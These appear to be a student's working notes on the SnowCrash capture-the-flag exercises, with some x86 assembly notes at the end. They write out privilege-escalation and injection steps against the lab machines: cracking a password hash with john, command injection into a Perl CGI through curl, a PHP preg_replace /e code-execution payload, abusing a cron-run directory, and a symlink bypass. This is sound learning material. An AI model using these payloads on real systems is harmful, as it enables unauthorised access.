find with certain permission:
- find / -user flag00 2>/dev/null : files that are owned by user flag00 || -perm -u=rw => permet de trier par execution.
- sudo -i => ouvrir une session root
- scp -P 4243 level00@127.0.0.1:/usr/sbin/john . => copy the john file in my actual directory
- >> /path/to/logfile 2>&1 => redirect standard output and error into the file
========================
level01

- Use john the ripper to retrieve a password encrypt in the /etc/passw
- Fpr the leve01 there is password encrypted int the /etc/passwd => flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
- there is two file on linux: the /etc/passwd and the /etc/shadow. 
	- The /etc/passwd contain information about users
	- The /etc/shadow contains keys to encrypt the password of every users
- The goal now is too cobine this two file to use john the ripper
- first file passwd contains : flag01:x:3001:3001::/home/flag/flag00:/bin/bash
- second file shadow contains: flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
- Combine this two files to have this command : unshadow passwd shadow > output.db
- And then use john : john --show output.db 

========================
level02 => pcap reading file. need to read the data of each packet with wireshark.
	right click on the packet inside wireshark => follow => TCP stream it gives me all the data from the conversation.

========================
level03 : strings <filename> => show only the caracters inside a file
	- objdump -d -Mintel level03 => dissasemble a binary file

- I just have to create  a script that launch getflag and  have the name echo and change the env PATH


======================
level04 : the goal was to elevated my privilege with a script perl:
		#!/usr/bin/perl
		# localhost:4747
		use CGI qw{param};
		print "Content-type: text/html\n\n";
		sub x {
		  $y = $_[0];
		  print `echo $y 2>&1`;
		}
		x(param("x"));
this is the script. so the script run on localhost:4747. I take a function call x who echo y which the first parameter pass to my perl script like argv[0] in c.
so as we saw we can launch the script and pass a parameter that is being print for example if i put:
./level04.pl x="salut"
it will print "salut"
so i can pass getflag tomy script because the permission are the following:
	-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl => i have the flag04 permission.
to pass a command to echo i have to put $(<command>)
the first problem was the output of this command:
	./level04.pl x="$(getflag)"
=> i had an output like that:
	Content-type: text/html

	sh: 2: Syntax error: ")" unexpected
	Check flag.Here is your token :
	level04@SnowCrash:~$ 
I have my token but the result of the token is not print directly. why??
Because when i pass the parameter $(getflag) the shell interpret it before passing it to the echo command. That is not the behaviour that we want
To prevent that we need to pass it like that to tell the shell to not interpret it => x=\$(getflag) with the \ this escape the interpretation.
but after passing this command:
	./level04.pl x="\$(getflag)"
I have this result:
	Content-type: text/html
	Check flag.Here is your token : Nope there is no token here for you sorry. Try again :)
it looks like the script isn't executing as flag00. why??
Because when the shell executing a script with setuid different the operating system ignore the setuid bit for interpreted script. It does it for security reason.
the real response specific to perl script is this one:
	When the kernel executes a file with the setuid bit set, it is supposed to run the process with the permissions of the file owner (in this case, flag04). 
	However, for interpreted scripts (e.g., those run by /usr/bin/perl), the kernel doesn't directly execute the script. 
	Instead, it invokes the interpreter (/usr/bin/perl) and passes the script as an argument. 
	This indirect execution bypasses the setuid mechanism, and the script runs with the permissions of the calling user (level04 in this case), not flag04.
So I was in the wrong direction. But if you see in my script the perl is using cgi module and run on localhost.
There is a webserver that is running on localhost:4747. I research for a culr command to execut my script:
	curl "http://localhost:4747/?x=\$(getflag)"
I try this one and it works.
But why now I have the permission of flag04 and not level04 as before? Because now I run my script from the webserv and that's him that interpret the script and not my operating system.
So there is not the security of the operating system that appear before.
I have a server that is running on my machine:
	netstat -tuln => show that process running. -t => tcp connections -u => udp connection -l => listening sockets -n => numerical addresses and ports
the output is:
	Active Internet connections (only servers)
	Proto Recv-Q Send-Q Local Address           Foreign Address         State      
	tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN     
	tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN     
	tcp6       0      0 :::4646                 :::*                    LISTEN     
	tcp6       0      0 :::4747                 :::*                    LISTEN     
	tcp6       0      0 :::80                   :::*                    LISTEN     
	tcp6       0      0 :::4242                 :::*                    LISTEN     
	udp        0      0 0.0.0.0:68              0.0.0.0:*                          
So i have a server that is running

=================================
level05
- I have a file with the permission flag05 named openarenaserver
- The permission are: -rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver => the + defines ACL: access control lists that extend the permission of a file
	- To see the other permissions I can use: getfacl <filename> that give me this output:
	- # file: usr/sbin/openarenaserver
	# owner: flag05
	# group: flag05
	user::rwx
	user:level05:r--
	group::r-x
	mask::r-x
	other::---
	- I can also set the ACL with: setfacl -m u:bernard:rw- test => set the read and write permission to the user bernard on the file test
- This script launch all the scirpt in a certain directory with the fag05 permission
- I have another thing when i log to my account I have this print: "You have new mail." => this message mean that there is a message in another directory. It located at /var/spool/mail
- The file contains: */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05 => which is a crontab that launch the script every two minutes
- The content of the script:
	#!/bin/sh

	for i in /opt/openarenaserver/* ; do
		(ulimit -t 5; bash -x "$i")
		rm -f "$i"
	done
- But i try to put a script in /opt/openarenaserver that print a message but it doesnt print but delete it. When i execute the script manually it print the mesage and delete it.
- It looks like with the crontab execution that it dont print anything , or dont execute anything on this repository. I think the output of crontab is redirected
- Ok I success. 
- The goal when i know that i can execute a script was to simply put a script with getflag and get the result. But in my previous test the output wasn't display. so I redirect the file like that:
	- echo $(getflag) >> /tmp/test 2>&1 => the last experession redirect standard input and error in the specified file

===================================
level06

- I have a php script file and an executable.
- The script is modifying the text passing in output
- The executable is like the executable of the script
- There is a vulnerabilitie inside the script: preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)
		- This line evaluate match pattern like php code. 
		- The match pattern is [x ], so what i put between the space and ] can be execute because /e treat this as a code and will execute it.
- Inside the pattern I put a command that will be execut: [x {${system(getflag)}}] => inside a file that I will pass as an argument
- The second parameter is unnecessary

==================================
level07

- I have an executable file. The executable was launching an environnement variable inside.
	- it was HOSTNAME=level07 
	- I just rename it HOSTNAME= '($getflag)'
- That's it


==================================
level08

- I have a binary and a file to read name level08 and token
- The binary is doing an strstr of token that prevent from reading a token file
- But my goal is to read it so i have to do an symbolic link to another file
- But initially i wa doing ln -s token /tmp/test and ./level08 /tmp/test 
	- the problem was that i dont give the fulle path of token so he dont know where it is
- The symbolink must look like that: ln -s /home/user/level08/token /tmp/test
	- So I have the full path of the token.

==================================
level09

- Same principle as the previous exercice


=================================
assembly explanation

- push <value>: add an operande (value) to the stack
- mov <target> <source> : add source to target
- and <target> <mask> : and binary, put the result inside target
- lea <target> <source> : load effective address, put the address of source inside target
- jle 

- sub <target> <value> : substract target with the value and store it inside target
- ebp => base pointer in assembly, all the other pointer are above it
- ebp will be the base pointer and esp will be at the max allcoate memory of the current function or space.

if i have a function: foo(1,2)
	- rdi => 1
	- rsi => 2
the return value of a functions come inside rax

mov     eax, [esp+18h]  ; Load group ID
mov     [esp+8], eax    ; Parameter 3
mov     eax, [esp+18h]  ; Load group ID again
mov     [esp+4], eax    ; Parameter 2
mov     eax, [esp+18h]  ; Load group ID once more
mov     [esp], eax      ; Parameter 1

mov [esp+1Ch], eax      ; Store value at offset 28 (0x1C)
mov eax, [esp+18h]      ; Load value from offset 24 (0x18)
mov [esp+8], eax        ; Store same value at offset 8
mov eax, [esp+18h]      ; Load same value again from offset 24
mov [esp+4], eax        ; Store same value at offset 4
mov eax, [esp+18h]      ; Load same value again from offset 24
mov [esp], eax          ; Store same value at offset 0

- dword means : double world
	- A word is 16 bits, 2 bytes => so dword is 4bytes in x86

mov dword ptr [esp+4], 0
mov dword ptr [esp+8], 42
call my_function

- For example this code is preparing the stack for the call of my_function: esp+4 will be the first argument and esp+8 will be the second 
	- In that case I use a cdecl convention where are called by the stack
	- fastcall conventions call arguments by register
- mov eax, [ebx] 	; Move the 4 bytes in memory at the address contained in EBX into EAX
- mov [var], ebx 	; Move the contents of EBX into the 4 bytes at memory address var. (Note, var is a 32-bit constant).
- Subroutine parameters are passed on the stack. Registers are saved on the stack, and local variables used by subroutines are placed in memory on the stack.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

int main(int argc, char *argv[])
{
        printf("%s\n", getenv("LD_PRELOAD"));
        if(open("/etc/ld.so.preload", 0) < 0)
        {
                printf("error opening %s\n", strerror(errno));
        }
        return (0);
}